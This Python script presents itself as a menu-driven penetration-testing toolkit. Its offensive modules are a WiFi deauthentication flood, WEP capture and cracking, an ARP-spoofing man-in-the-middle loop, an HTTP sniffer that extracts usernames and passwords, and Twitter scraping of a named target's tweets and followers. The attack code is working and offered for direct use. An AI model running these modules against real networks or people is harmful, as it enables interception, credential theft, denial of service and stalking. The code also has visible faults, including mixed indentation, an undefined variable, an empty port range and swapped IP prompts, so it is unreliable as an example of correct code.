#!/usr/bin/python3
import subprocess, time, sys, re, os

print("""                                             		                         
                        @@@%%%%%%&@@@                       
                     @@@%%%%%%%%%%%%%@@@                    
                   @@%%%%%%%%%%%%%%%%%%%@@                  
                 @@%%%%%%%%%%%%%%%%%%%%%%%@@                
                @@%%%%%%%%%%%%%%%%%%%%%%%%%@@               
              /@%%%%%%%%%%%%%%%%%%%%%%%%%%%%&@(             
              @@%%@@@@..................@@@@%%@@             
             @@@@&@@%@.................@@@@&@@@@            
              @@&&&@@@.................@@@&&&@@             
               @@&&&&@@...............@@&&&&@@              
                @@&&&&&@@...........@@&&&&&@@               
                 @@@&&&&@@@@.....@@@&&&&&@@,                
                 ,@@@@@@@@@.../...&@@@@@@@@,                
          @@.%%%%%%%%%%%%%%%@@@@@%%%%%%%%%%%%%%%#@@           
        @@                                      ...@@       
        ,@                  @@@@@              ....@@       
        %@&             @@ @@@@@@@ @@          ...(@%       
      @@%@@              .@@@@@@@@@.           ...@@%@@     
    @@%%%@@             #(@@((@((@@((          ...@@%%%@@   
    @@%%%%@.            @@@@((@((@@@@         ....@&%%%@@   
     @@%%%@@            @   @@@@@   @         ...@@%%%@@    
      @@%%@@                                  ...@@%%@@     
       @@*......................................,,,,@@          
	\n""")
print("""
    ____             __            __               __              ____   _ __ 
   / __ \___  ____  / /____  _____/ /____  _____   / /_____  ____  / / /__(_) /_
  / /_/ / _ \/ __ \/ __/ _ \/ ___/ __/ _ \/ ___/  / __/ __ \/ __ \/ / //_/ / __/
 / ____/  __/ / / / /_/  __(__  ) /_/  __/ /     / /_/ /_/ / /_/ / / ,< / / /_  
/_/    \___/_/ /_/\__/\___/____/\__/\___/_/      \__/\____/\____/_/_/|_/_/\__/                                                                                 
 \n""")

def main():
	choice = int(input("[?] Welcome, what module you wish to load 1 - 10 :\n[+] 10 Modules loaded\n[0] Quit program\n[99] Show modules\n\n"))

	## PASSWORD GENERATOR
	def psswd_gen():
		print("[=] Running Module nº1: Password generator...")
		import string
		import random
		try:
			length = int(input("[?] Please enter the length of the password: "))

			ascii_lower = string.ascii_lowercase
			ascii_upper = string.ascii_uppercase
			ascii_digits = string.digits
			ascii_symbols = string.punctuation
			ascii_all = ascii_symbols + ascii_digits + ascii_upper + ascii_lower

			mix = random.sample(ascii_all, length)	
			password = "".join(mix)

			print("[+] Here's your new password: " + password)
		except ValueError:
			print("\n[-] Length has to be a int value, quitting...")

	## WORDLIST GENERATOR
	def wordlists():
		try:
			print("[=] Running Module nº2: Wordlist generator...")
			print("[?] Do you wish to specify a pattern? like a@@@@b = starts with and ends with b")
			print("[1] Yes")
			q = input("[2] No\n")
			if q == "1":
				number = input("[?] Please insert the number of characters you wish to use for the wordlist: ")
				chars = input("[?] Characters you wish to use for password: ")

				print("[?] Specify the name of the .txt you wish to use for new wordlist: ")
				file = input("[+] add .txt at the end, please\n")

				print("[?] The pattern you wish to use:")
				pattern = input("[+] Use @ for any character\n")

				print("[=] Generating wordlist ...")
				subprocess.run(["sudo", "crunch", number, number, chars,"-t", pattern, "-o", file])
			else:
				minimum = input("[?] Please insert the minimum characters of the password: ")
				maximum = input("[?] Please insert the maximum characters of the password: ")
				chars = input("[?] Characters you wish to use for password: ")
				
				print("[?] Specify the name of the .txt you wish to use for new wordlist: ")
				file = input("[+] add .txt at the end, please\n")
				
				print("[=] Generating wordlist ...")
				subprocess.run(["sudo", "crunch", minimum, maximum, chars, "-o", file])
		
		except KeyboardInterrupt:
			print("\n[-] Program ended by user: KeyboardInterrupt, quitting...")

	## TWEETER INFORMATION GATHERING with twint #
	def tweets():
		import twint
		print("[=] Running Module nº3: Twitter information gathering...")
		t = twint.Config()
		name_output = input("[?] Please specify a name for the output folder: ")
		t.Output = name_output
		print("[?] Please specify a limit for gathered tweets: ")
		limit = int(input("[+] Don't go above 3200\n"))
		t.Limit = limit
		t.Store_json = True

		print("\n[?] What do you wish to search for: ")
		print("--------------------------------------------")
		print("[1]--User Tweets")
		print("[2]--Location based Tweets")
		print("[3]--Target's followers")
		print("[4]--Target's following")
		choice = int(input("[5]--Target's information\n"))
		if choice == 1:
			username = input("[?] Please specify the username you wish to target: ")
			t.Username = username
			## PAIN IN THE FUCKING ASS QUESTION
			one_choice = input("[?] You wish to specify a hastag (Y/n): ")
			if one_choice.upper() == "Y":
				print("[?] Please, specify it: ")
				hastag = input("[+] remember to use # before keyword  ")
				t.Search = hastag
				t.Show_hastags = True
				two_choice = input("[?] You wish to specify a location to target (Y/n): ")
				if two_choice.upper() == "Y":
					location = input("[?] Please, specify it: ")
					t.Near = location

					three_choice = input("[?] You wish to specify a user that the original target tweeted to (Y/n): ")
					if three_choice.upper() == "Y":
						who = input("[?] Please, specify the user: ")
						t.To = who

						four_choice = input("[?] You wish to filter tweets sent since a specific date (Y/n): ")
						if four_choice.upper() == "Y":
							print("?] Please, specify it: ")
							since = input("[+] input as shown in this example: 2017-12-27   ")
							t.Since = since
							
							five_choice = input("[?] You wish to filter tweets sent until a specific date (Y/n): ")
							if five_choice.upper() == "Y":
								print("?] Please, specify it: ")
								until = input("[+] input as shown in this example: 2017-12-27   ")
								t.Until = until
							else:
								print("[=] Gathering tweets and storing them ")
						#4_1	
						else:
							five_choice = input("[?] You wish to filter tweets sent until a specific date (Y/n): ")
							if five_choice.upper() == "Y":
								print("?] Please, specify it: ")
								until = input("[+] input as shown in this example: 2017-12-27   ")
								t.Until = until
							else:
								print("[=] Gathering tweets and storing them ")
					#3_1
					else:
						four_choice = input("[?] You wish to filter tweets sent since a specific date (Y/n): ")
						if four_choice.upper() == "Y":
							print("?] Please, specify it: ")
							since = input("[+] input as shown in this example: 2017-12-27   ")
							t.Since = since
							
							five_choice = input("[?] You wish to filter tweets sent until a specific date (Y/n): ")
							if five_choice.upper() == "Y":
								print("?] Please, specify it: ")
								until = input("[+] input as shown in this example: 2017-12-27   ")
								t.Until = until
							else:
								print("[=] Gathering tweets and storing them ")
						else:
							five_choice = input("[?] You wish to filter tweets sent until a specific date (Y/n): ")
							if five_choice.upper() == "Y":
								print("?] Please, specify it: ")
								until = input("[+] input as shown in this example: 2017-12-27   ")
								t.Until = until
							else:
								print("[=] Gathering tweets and storing them ")
				#2_1
				else:
					three_choice = input("[?] You wish to specify a user that the original target tweeted to (Y/n): ")
					if three_choice.upper() == "Y":
						who = input("[?] Please, specify the user: ")
						t.To = who

						four_choice = input("[?] You wish to filter tweets sent since a specific date (Y/n): ")
						if four_choice.upper() == "Y":
							print("?] Please, specify it: ")
							since = input("[+] input as shown in this example: 2017-12-27   ")
							t.Since = since
							
							five_choice = input("[?] You wish to filter tweets sent until a specific date (Y/n): ")
							if five_choice.upper() == "Y":
								print("?] Please, specify it: ")
								until = input("[+] input as shown in this example: 2017-12-27   ")
								t.Until = until
							else:
								print("[=] Gathering tweets and storing them ")
						else:
							five_choice = input("[?] You wish to filter tweets sent until a specific date (Y/n): ")
							if five_choice.upper() == "Y":
								print("?] Please, specify it: ")
								until = input("[+] input as shown in this example: 2017-12-27   ")
								t.Until = until
							else:
								print("[=] Gathering tweets and storing them ")
					#3
					else:
						four_choice = input("[?] You wish to filter tweets sent since a specific date (Y/n): ")
						if four_choice.upper() == "Y":
							print("?] Please, specify it: ")
							since = input("[+] input as shown in this example: 2017-12-27   ")
							t.Since = since
							
							five_choice = input("[?] You wish to filter tweets sent until a specific date (Y/n): ")
							if five_choice.upper() == "Y":
								print("?] Please, specify it: ")
								until = input("[+] input as shown in this example: 2017-12-27   ")
								t.Until = until
							else:
								print("[=] Gathering tweets and storing them ")
						#4
						else:
							five_choice = input("[?] You wish to filter tweets sent until a specific date (Y/n): ")
							if five_choice.upper() == "Y":
								print("?] Please, specify it: ")
								until = input("[+] input as shown in this example: 2017-12-27   ")
								t.Until = until
							else:
								print("[=] Gathering tweets and storing them ")
			else:
				two_choice = input("[?] You wish to specify a location to target (Y/n): ")
				if two_choice.upper() == "Y":
					print("")
					location = input("[?] Please, specify it: ")
					t.Near = location
					three_choice = input("[?] You wish to specify a user that the original target tweeted to (Y/n): ")
					if three_choice.upper() == "Y":
						who = input("[?] Please, specify the user: ")
						t.To = who

						four_choice = input("[?] You wish to filter tweets sent since a specific date (Y/n): ")
						if four_choice.upper() == "Y":
							print("?] Please, specify it: ")
							since = input("[+] input as shown in this example: 2017-12-27   ")
							t.Since = since
							
							five_choice = input("[?] You wish to filter tweets sent until a specific date (Y/n): ")
							if five_choice.upper() == "Y":
								print("?] Please, specify it: ")
								until = input("[+] input as shown in this example: 2017-12-27   ")
								t.Until = until
							else:
								print("[=] Gathering tweets and storing them ")
					else:
						four_choice = input("[?] You wish to filter tweets sent since a specific date (Y/n): ")
						if four_choice.upper() == "Y":
							print("?] Please, specify it: ")
							since = input("[+] input as shown in this example: 2017-12-27   ")
							t.Since = since
							
							five_choice = input("[?] You wish to filter tweets sent until a specific date (Y/n): ")
							if five_choice.upper() == "Y":
								print("?] Please, specify it: ")
								until = input("[+] input as shown in this example: 2017-12-27   ")
								t.Until = until
						else:
							five_choice = input("[?] You wish to filter tweets sent until a specific date (Y/n): ")
							if five_choice.upper() == "Y":
								print("?] Please, specify it: ")
								until = input("[+] input as shown in this example: 2017-12-27   ")
								t.Until = until
							else:
								print("[=] Gathering tweets and storing them ")
				else:
					three_choice = input("[?] You wish to specify a user that the original target tweeted to (Y/n): ")
					if three_choice.upper() == "Y":
						who = input("[?] Please, specify the user: ")
						t.To = who

						four_choice = input("[?] You wish to filter tweets sent since a specific date (Y/n): ")
						if four_choice.upper() == "Y":
							print("?] Please, specify it: ")
							since = input("[+] input as shown in this example: 2017-12-27   ")
							t.Since = since
							
							five_choice = input("[?] You wish to filter tweets sent until a specific date (Y/n): ")
							if five_choice.upper() == "Y":
								print("?] Please, specify it: ")
								until = input("[+] input as shown in this example: 2017-12-27   ")
								t.Until = until
							else:
								print("[=] Gathering tweets and storing them ")
						else:
							five_choice = input("[?] You wish to filter tweets sent until a specific date (Y/n): ")
							if five_choice.upper() == "Y":
								print("?] Please, specify it: ")
								until = input("[+] input as shown in this example: 2017-12-27   ")
								t.Until = until
							else:
								print("[=] Gathering tweets and storing them ")
					else:
						four_choice = input("[?] You wish to filter tweets sent since a specific date (Y/n): ")
						if four_choice.upper() == "Y":
							print("?] Please, specify it: ")
							since = input("[+] input as shown in this example: 2017-12-27   ")
							t.Since = since
							
							five_choice = input("[?] You wish to filter tweets sent until a specific date (Y/n): ")
							if five_choice.upper() == "Y":
								print("?] Please, specify it: ")
								until = input("[+] input as shown in this example: 2017-12-27   ")
								t.Until = until
						else:
							five_choice = input("[?] You wish to filter tweets sent until a specific date (Y/n): ")
							if five_choice.upper() == "Y":
								print("?] Please, specify it: ")
								until = input("[+] input as shown in this example: 2017-12-27   ")
								t.Until = until
							else:
								print("[=] Gathering tweets and storing them ")
		    twint.run.Search(t)
		    print(f"[+] RESULTS STORED IN {file} FOLDER")
		elif choice == 2:
			location = input("[?] Please, specify it: ")
			t.Near = location
			four_choice = input("[?] You wish to filter tweets sent since a specific date (Y/n): ")
			if four_choice.upper() == "Y":
				print("?] Please, specify it: ")
				since = input("[+] input as shown in this example: 2017-12-27   ")
				t.Since = since
							
				five_choice = input("[?] You wish to filter tweets sent until a specific date (Y/n): ")
				if five_choice.upper() == "Y":
					print("?] Please, specify it: ")
					until = input("[+] input as shown in this example: 2017-12-27   ")
					t.Until = until
				else:
					print("[=] Gathering tweets and storing them ")
			else:
				five_choice = input("[?] You wish to filter tweets sent until a specific date (Y/n): ")
				if five_choice.upper() == "Y":
					print("?] Please, specify it: ")
					until = input("[+] input as shown in this example: 2017-12-27   ")
					t.Until = until
				else:
					print("[=] Gathering tweets and storing them ")
			twint.run.Search(t)
			print(f"[+] RESULTS STORED IN {file} FOLDER")
		elif choice == 3:
			username = input("[?] Please specify the username you wish to target: ")
			t.Username = username
			t.User_full = True
			print("[=] Gathering target information...\n")
			twint.run.Followers(t)
			print(f"[+] RESULTS STORED IN {file} FOLDER")
			print("\n\n[-] Program finished, quitting...")
		elif choice == 4:
			username = input("[?] Please specify the username you wish to target: ")
			t.Username = username
			t.User_full = True
			print("[=] Gathering target information...\n")
			twint.run.Following(t)
			print(f"[+] RESULTS STORED IN {file} FOLDER")
			print("\n\n[-] Program finished, quitting...")
		elif choice == 5:
			username = input("[?] Please specify the username you wish to target: ")
			t.Username = username
			t.User_full = True
			print("[=] Gathering target information...\n")
			twint.run.Lookup(t)
			print(f"[+] RESULTS STORED IN {file} FOLDER")
			print("\n\n[-] Program finished, quitting...")
		else:
			print("\n[-] None chosen, quitting...\n")


	## MAC ADDRESS CHANGER ##
	def mac_changer():
		print("[=] Running Module nº3: MAC address changer...")
		interface = input("[?] Please input the name of the interface you wish to change it's MAC address: ")
		new_mac = input("[?] Specify the new MAC address you wish to use for the interface " + interface + ": \n")
		subprocess.run(["sudo", "ifconfig", interface, "down"])
		print("[=] Chaning MAC address to the desired one: ")
		subprocess.run(["sudo", "ifconfig", interface, "hw", "ether", new_mac])
		subprocess.run(["ifconfig", interface, "up"])

	## NETWORK SCANNER ##
	def net_scan():
		import scapy.all as scapy
		print("[=] Running Module nº4: Network Scanner...")
		print("[?] Please enter the range of your subnet: ")
		ip_range = input("[+] Format: 192.168.1.1/24\n")
		count = 0
		while count < 5:
		    arp_result = scapy.arping(ip_range)
		    print("-------------------------------------")
		    print("  MAC address	    Vendor  IP")
		    count += 1
	
	## 	PORT SCANNER ##
	def port_scan():
		print("[=] Running Module nº5: Port Scanner...")
		import socket, time
		target = input("[?] Specify the target ip address: ")

		# SCANNER FUNCTION
		def scanner(port):
			try:
				sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				sock.settimeout(0.5)
				sock.connect((target, port))
				sock.close()
				return True
			except:
				return False

		print("\n[=] Scanning common ports...")
		print("----------------------------")

		# Common Ports
		common_ports = {
		 
			'21': 'FTP',
			'22': 'SSH',
			'23': 'TELNET',
			'25': 'SMTP',
			'53': 'DNS',
			'69': 'TFTP',
			'80': 'HTTP',
			'109': 'POP2',
			'110': 'POP3',
			'123': 'NTP',
			'137': 'NETBIOS-NS',
			'138': 'NETBIOS-DGM',
			'139': 'NETBIOS-SSN',
			'143': 'IMAP',
			'156': 'SQL-SERVER',
			'389': 'LDAP',
			'443': 'HTTPS',
			'546': 'DHCP-CLIENT',
			'547': 'DHCP-SERVER',
			'995': 'POP3-SSL',
			'993': 'IMAP-SSL',
			'2086': 'WHM/CPANEL',
			'2087': 'WHM/CPANEL',
			'2082': 'CPANEL',
			'2083': 'CPANEL',
			'3306': 'MYSQL',
			'8443': 'PLESK',
			'10000': 'VIRTUALMIN/WEBMIN'
		}

		for p, service in common_ports.items():
				port = int(p)
				result = scanner(port)
				if result == True:
					print("[+] Port "+ p + " running " + service +" service, is open!" )
				else:
					pass

		# RANGE SCAN
		try:
			print("\n[?] Do you wish to scan a specific port range:")
			print("----------------------------------------------")
			print("[1] Yes")
			print("[2] No")
			question = int(input("----------------------------------------------\n"))

			# RANGE
			if question == 1:
				print("\nPORT Ranges")
				print("------------------")
				print("[1] 1-500 ")
				print("[2] 500-1000")
				print("[3] 1000-1500")
				print("[4] 1500-2000")
				print("[5] 2000-2500")
				print("[6] 2500-3000")
				print("[7] 3000-3500")
				print("[8] 3500-4000")
				print("[9] 4000-4500")
				print("[10] 4500-5000")
				print("[11] 5000-5500")
				print("[12] 5500-6000")
				print("[13] 6000-6500")
				print("[14] 6500-7000")
				print("[15] 7000-7500")
				print("[16] 7500-8000")
				print("[17] 8000-8500")
				print("[18] 8500-9000")
				print("[19] 9000-9500")
				print("[20] 9500-10000")
				print("------------------")
				range_choosen = int(input("[+] What's the desired range you wish to scan 1 - 20: "))
				print("\n")
				if range_choosen == 1:
					for i in range(1, 500):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 2:
					for i in range(500, 1000):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 3:
					for i in range(1000, 1500):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 4:
					for i in range(1500, 2000):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 5:
					for i in range(2000, 2500):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 6:
					for i in range(2500, 3000):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 7:
					for i in range(3000, 3500):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 8:
					for i in range(3500, 4000):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 9:
					for i in range(4000, 4500):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 10:
					for i in range(4500, 5000):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 11:
					for i in range(5000, 5500):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 12:
					for i in range(5500, 6000):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 13:
					for i in range(6000, 6500):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 14:
					for i in range(6500, 7000):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 15:
					for i in range(7000, 7500):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 16:
					for i in range(8500, 8000):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 17:
					for i in range(8000, 8500):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 18:
					for i in range(8500, 9000):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 19:
					for i in range(9000, 9500):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 20:
					for i in range(9500, 10000):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
			elif question == 2:
				print("[-] Goodbye!")
			else:
				print("[-] None chosen, Goodbye!")		
		except KeyboardInterrupt:
			print("\n[-] Program ended by user, quitting...")
		except ValueError:
			print("\n[-] None chosen, Goodbye!")

	## DEAUTHORIZATION ATTACK
	def deauth_attack():
		print("[=] Running Module nº6: Deauthorization Attack...")
		try:
			print("[+] Use Ctrl + c at any time to quit scan and proceed to deauth attack.")
			interface = input("[?] Please specify the interface you wish to use: ")
			subprocess.run(["ifconfig", interface, "down"])
			# Kill processes in network
			subprocess.run(["sudo", "airmon-ng", "check", "kill"])
			subprocess.run(["iwconfig", interface, "mode", "monitor"])
			subprocess.run(["ifconfig", interface, "up"])
			try:
				band = int(input("[?] Check for 2 or 5G networks? Input 2 for 2G and 5 for 5G or 1 for both:"))
				if band == 2:
					subprocess.run(["sudo", "airodump-ng", interface])
				elif band ==5:
					subprocess.run(["sudo", "airodump-ng", "--band", "a", interface])
				elif band ==1:
					subprocess.run(["sudo", "airodump-ng", "--band", "abg", interface])
				else:
					print("[-] None of the above chosen, quitting program")
			except ValueError:
				print("[-] None of the above chosen, quitting program")
		except KeyboardInterrupt:
			try:
				print("[?] Please specify the details of your desired network:")
				print("-------------------------------------------------------")
				bssid = input("[?] Router MAC address: ")
				channel = input("[?] Channel used: ")
				print("[+] Ctrl + c to proceed when you wish")

				subprocess.run(["sudo", "airodump-ng", "--bssid", bssid, "--channel", channel, interface])

			except KeyboardInterrupt:
				try:
					target_bssid = input("[?] Client MAC address you wish to target: ")
					print("[=] Running Deauth attack...")

					subprocess.run(["sudo", "aireplay-ng", "--deauth", "100000000000", "-a", bssid, "-c", target_bssid, interface])
				except KeyboardInterrupt:
					print("[-] Program finished, restoring network for target...")
					
	## WEP CRACKING
	def wep_crack():
		print("[=] Running Module nº7: WEP Cracking Attack...")
		try:
			print("[+] Use Ctrl + c at any time to quit scan and proceed to deauth attack.")
			interface = input("[?] Please specify the interface you wish to use: ")
			subprocess.run(["ifconfig", interface, "down"])
			subprocess.run(["sudo", "airmon-ng", "check", "kill"])
			subprocess.run(["iwconfig", interface, "mode", "monitor"])
			subprocess.run(["ifconfig", interface, "up"])
			subprocess.run(["sudo","airodump-ng", interface, "--encrypt", "wep"])
		except KeyboardInterrupt:
			try:
				print("[?] Please specify the details of your desired network:")
				print("-------------------------------------------------------")
				bssid = input("[?] Router MAC address: ")
				channel = input("[?] Channel used: ")
				file = input("[?] File name you wish to use for .cap file: ")
				print("[+] Ctrl + c to proceed when you wish")

				subprocess.run(["sudo", "airodump-ng", "--bssid", bssid, "--channel", channel,"--write", file, interface])

			except KeyboardInterrupt:
				try:
					print(f"[=] {file} generated, cracking password...")
					subprocess.run(["sudo", "aircrack-ng", file])
				except KeyboardInterrupt:
					print("[-] Program finished by user, quitting...")

	## ARP SPOOF ##
	def arp_spoof():
		import scapy.all as scapy
		print("[=] Running Module nº8: Arp spoofing attack...")
		print("[+] Run echo 1 > /proc/sys/net/ipv4/ip_forward as root")
		def get_mac(ip):
			arp_request = scapy.ARP(pdst=ip)
			broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
			arp_request_broadcast = broadcast/arp_request
			answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
			
			return answered_list[0][1].hwsrc

		def spoof(target_ip, spoof_ip):
			target_mac = get_mac(target_ip)
			# Create ARP packet and send it to target
			packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
			scapy.send(packet, verbose=False)

		def restore(dest_ip, src_ip):
			dest_mac = get_mac(dest_ip)
			src_mac = get_mac(src_ip)
			packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
			scapy.send(packet, verbose=False)

		router_ip = input("[?] Enter the target ip address: ")
		target_ip = input("[?] Enter the router ip address: ")

		sent_packets_count = 0 
		try:
			while True:
				spoof(target_ip, router_ip)
				spoof(router_ip, target_ip)
				sent_packets_count = sent_packets_count + 2
				print("\r[=] Packets sent: " + str(sent_packets_count), end="")
				time.sleep(2)
		except KeyboardInterrupt:
			print("\n[-] Program ended by user, quitting and restorin ARP tables...")
			restore(target_ip, router_ip)

	## P*SSWRD AND URL SNIFFER ##
	def psswd_url_sniff():	
		import scapy.all as scapy
		from scapy.layers import http
		print("[=] Running Module nº10: Password and Url sniffer...")

		try:
			
			def sniff(interface):
				scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet, filter="")
			
			def get_url(packet):
				return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

			def get_login(packet):
				if packet.haslayer(scapy.Raw):
						load = str(packet[scapy.Raw].load)
						keywords = ["username", "password", "user", "passwd", "usr", "login", "pass"]
						for keyword in keywords:
							if keyword in load:
								return load

			def process_sniffed_packet(packet):
				if packet.haslayer(http.HTTPRequest):
					
					url = get_url(packet)
					print("[+] HTTPRequest >> " + url.decode())

					login_info = get_login(packet)
					if login_info:
						print("\n\n[+] Possible login info >> " + login_info + "\n\n\n")
					
			interface = input("[?] Interface you wish to use for sniffing attack: ")
			sniff(interface) 
			print("[=] Sniffer running...")
		except KeyboardInterrupt:
			print("\n[-] Program ended by user, quitting...")

	## OPTIONS
	def show_modules():
		print("\n[1]--Password generator")
		print("[2]--Wordlist Generator")
		print("[3]--Twitter information gathering")
		print("[4]--MAC address changer")
		print("[5]--Network Scanner")
		print("[6]--Port Scanner")
		print("[7]--Deauthorization Attack")
		print("[8]--WEP Cracking")
		print("[9]--Arp spoofing attack")
		print("[10]--Password and Url sniffer")
		print("\n\n[0]--Quit")
		print("---------------------------------")
		try:
			option = int(input("[?] Where do you want to start: "))
			if option == 1:
				psswd_gen()
			elif option == 2:
				wordlists()
			elif option == 3:
				tweets()
			elif option == 4:
				mac_changer()
			elif option == 5:
				net_scan()
			elif option == 6:
				port_scan()
			elif option == 7:
				deauth_attack()
			elif option == 8:
				wep_crack()
			elif option == 9:
				arp_spoof()
			elif option == 10:
				psswd_url_sniff()
			elif option == 0:
				print("[-] Quitting...")
		except KeyboardInterrupt:
			print("\n[-] Program interrumpted, quitting...")
		except ValueError:
			print("\n[-] Wrong value given, quitting...")

	try:
		if choice == 99:
			show_modules()
		elif choice == 1:
			psswd_gen()
		elif choice == 2:
			wordlists()
		elif choice == 3:
			tweets()
		elif choice == 4:
			mac_changer()
		elif choice == 5:
			net_scan()
		elif choice == 6:
			port_scan()
		elif choice == 7:
			deauth_attack()
		elif choice == 8:
			wep_crack()
		elif choice == 9:
			arp_spoof()
		elif choice == 10:
			psswd_url_sniff()
		elif choice == 0:
			print("[-] Quitting...")
		else:
			print("[-] None chosen, quitting...")
	except KeyboardInterrupt:
		print("\n[-] Program interrumpted, quitting...")
	except ValueError:
		print("\n[-] Wrong value given, quitting...")


# CHECK SUDO
def is_root():
    return os.geteuid() == 0
sudo = is_root()
if sudo == True:
	main()
else:
	print("[+] Please, run this toolkit as sudo")
